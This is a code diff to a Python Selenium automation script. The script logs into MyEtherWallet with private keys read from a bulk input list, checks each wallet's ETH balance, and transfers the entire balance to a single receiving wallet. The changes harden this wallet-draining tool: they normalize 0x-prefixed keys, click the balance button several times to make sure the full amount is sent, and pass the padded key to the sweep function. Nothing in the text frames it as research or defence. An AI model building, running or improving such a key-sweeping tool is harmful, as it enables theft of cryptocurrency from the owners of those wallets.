@@ -254,8 +254,17 @@ def key_helper(privKey):
     if num_words == 12 or num_words == 24:
         return num_words
     else:
+        privKey = privKey.replace(' ', '')  # Strip any whitespace
+        first_two = ''.join(list(privKey)[0:2])
+        if "0x" in first_two:
+            if len(privKey) < 66:
+                list(privKey)
+                remainder = ''.join(list(privKey)[2:])
+                key = first_two + "0" * (64 - len(remainder)) + remainder
+            else:
+                key = privKey
         # Wallets must be 64 chars. If they're less, pad them out with 0s.
-        if len(privKey) < 64:
+        elif len(privKey) < 64:
             key = "0" * (64 - len(privKey)) + privKey
         elif len(privKey) > 65:
             key = None  # Key is invalid!
@@ -275,6 +284,7 @@ def do_login(driver, privKey):
     """
     url = "https://www.myetherwallet.com/"
     padded_key = key_helper(privKey)
+
     timeout = 60
 
     if padded_key:
@@ -465,14 +475,20 @@ def dump_eth(driver, privKey, results):
         )
         to_address.click()
         to_address.send_keys(rxwallet)
-
+        # Sometimes it takes a second to calculate the gas on a laggy connection.
+        time.sleep(2)
         # Click the button to populate the entire balance automatically.
         entire_balance_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[2]/div/div[1]/div[2]/div[1]/p"
         entire_balance_btn = WebDriverWait(driver, timeout).until(
             EC.element_to_be_clickable((By.XPATH, entire_balance_xpath))
         )
+        # Sometimes the button doesn't work on the first click. Just click it a couple times before sending.
         entire_balance_btn.click()
-
+        time.sleep(2)
+        entire_balance_btn.click()
+        time.sleep(2)
+        entire_balance_btn.click()
+        time.sleep(2)
         # Send the transaction.
         send_tx_xpath = "/html/body/div[1]/div[3]/div[9]/div[2]/div/div[4]/div[4]/div[1]"
 
@@ -518,9 +534,11 @@ def run_worker(chunked_work):
         try:
             html = do_login(driver, privKey=privKey)
             if html:
-                results = parse_page(html, privKey)
+                # Run this to fix log output
+                key = key_helper(privKey)
+                results = parse_page(html, key)
                 if float(results.get('ETH')) > 0 and rxwallet:
-                    dump_eth(driver, privKey, results)
+                    dump_eth(driver, key, results)
             if pbar.last_print_n % 100 == 0:
                 logger.info(f"Totals so far in all wallets: ${get_usd_totals()}: {usd_totals}")
         except Exception as unhandled:
@@ -590,7 +608,6 @@ def main():
 
     global rxwallet
     rxwallet = args.rxwallet
-
 
     if args.inlist:
         f = open(args.inlist, 'r')
